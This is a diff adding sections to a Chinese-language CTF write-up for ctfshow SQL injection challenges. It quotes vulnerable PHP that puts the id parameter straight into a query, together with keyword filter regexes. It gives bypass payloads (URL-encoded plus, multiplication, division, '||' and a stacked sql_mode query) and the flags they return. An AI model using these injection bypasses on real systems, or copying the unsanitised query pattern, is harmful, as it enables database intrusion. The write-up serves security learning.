@@ -289,3 +289,98 @@ payload:`1;set sql_mode=PIPES_AS_CONCAT;select 1`
 
 人话就是，把原本判断用法的逻辑运算符改成了连字符用法，输出：
 `Array([0]=>1)Array([0]=>1flag{6fc12e75-bcc3-4c8d-9bfd-85a2630b9f31})`
+
+## web1
+
+````php
+if(isset($_GET['id'])){
+    $id = $_GET['id'];
+    # 判断id的值是否大于999
+    if(intval($id) > 999){
+        # id 大于 999 直接退出并返回错误
+        die("id error");
+    }else{
+        # id 小于 999 拼接sql语句
+        $sql = "select * from article where id = $id order by id limit 1 ";
+        echo "执行的sql为：$sql<br>";
+        # 执行sql 语句
+        $result = $conn->query($sql);
+        # 判断有没有查询结果
+        if ($result->num_rows > 0) {
+            # 如果有结果，获取结果对象的值$row
+            while($row = $result->fetch_assoc()) {
+                echo "id: " . $row["id"]. " - title: " . $row["title"]. " <br><hr>" . $row["content"]. "<br>";
+            }
+        }
+        # 关闭数据库连接
+        $conn->close();
+    }
+    
+}else{
+    highlight_file(__FILE__);
+}
+?>
+</body>
+<!-- flag in id = 1000 -->
+````
+
+`%2b`即为+，构建payload：`/?id=1%2b999`
+
+得到flag：`ctfshow{c19d5249-4232-424a-97c4-1e3474c7dba8}`
+
+## web2
+
+区别：
+
+````php
+正则表达式 `/or|\+/i` 表示匹配字符串中是否存在 `"or"` 或者 `"+"`。其中 `"i"` 表示不区分大小写。
+````
+
+那用乘法就好了。。。
+
+payload:`/?id=2*500`
+
+还找了半天乘号的url编码，原来可以直接用。。。
+
+`ctfshow{823e8ecb-33e3-4211-8d1f-1cd473263902}`
+
+## web3
+
+新增限制：
+
+````php
+if(preg_match("/or|\-|\\|\*|\<|\>|\!|x|hex|\+/i",$id)){
+            die("id error");
+    }
+````
+
+ 正则表达式 `/or|\-|\\|\*|\<|\>|\!|x|hex|\+/i` 表示匹配包含以下任意一个字符的字符串：`or`、`-`、`\`（反斜杠）、`*`、`<`、`>`、`!`、`x`、`hex`、`+`。其中 `i` 表示不区分大小写。
+
+ 你等等，除号`/`没屏蔽，试试：
+
+ payload:`/?id=500/0.5`
+
+ 不知道为啥2000/2不行，可能是因为先传入的2000>999了。
+
+ `ctfshow{7326bf8d-aeca-405c-8ccf-088fbf64b61f}`
+
+ ## web4
+
+ ````php
+ if(preg_match("/or|\-|\\\|\/|\\*|\<|\>|\!|x|hex|\(|\)|\+|select/i",$id)){
+            die("id error");
+    }
+````
+
+正则表达式 `/or|\-|\\\|\/|\\*|\<|\>|\!|x|hex|\(|\)|\+|select/i` 表示匹配包含以下任意一个字符的字符串：`or`、`-`、`\`（反斜杠）、`/`、`*`、`<`、`>`、`!`、`x`、`hex`、`(`、`)`、`+`、`select`。其中 `i` 表示不区分大小写。
+
+全屏蔽了，但是没完全屏蔽：`|`，或运算没有被屏蔽，所以：
+
+payload:`/?id=999||id=1000`
+
+`执行的sql为：select * from article where id = 999||id=1000 order by id limit 1`
+
+`ctfshow{1f31bdb8-81ae-4546-a1d2-c9af01aadb46}`
+
+## web5
+
